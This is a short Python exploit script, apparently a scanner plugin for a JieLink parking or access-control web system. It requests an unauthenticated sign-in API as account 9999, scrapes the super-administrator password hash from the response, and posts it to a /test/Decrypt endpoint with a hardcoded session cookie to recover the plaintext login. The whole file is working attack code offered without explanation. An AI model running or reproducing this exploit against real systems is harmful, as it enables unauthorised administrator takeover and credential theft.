import re
import requests

global userpwd


def exp_check(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'
    }
    url1 = url+"/auth/Apisignin?uname=9999&upwd=1"
    global userpwd
    try:
        response = requests.get(url=url1, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and "超级管理员" in response.text:
            userpwd = re.findall('"UserPwd":"(.*?)"', response.text)[0]
            return 1

    except:
        return 3


def exp_others(url):
    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie':'DefaultSystem=JieLink; ASP.NET_SessionId=4lyhev55dzsecvtdbteo0erv; JSST.AUTH=E7FD5E58C9C44FDD4B5AB59A96F02D273DBA14EBB51334BBED9CFC5452618FF24266456540D6419DE328304F44F98DE1DEA8E2DE34FA07DCBD88D0F19C0DF5C1A8D411CCD8CFC830B8369C4FD48EFD160BC55E82535C8E3A841D99506C1C30F0'
    }
    global userpwd
    url4 = url+"/test/Decrypt"
    data = "str="+userpwd
    try:
        response = requests.post(url=url4,headers=headers,data=data,timeout=5)
        if response.status_code == 200:
            return "账号：9999    \n"+"登录："+response.text
    except:
        return 3

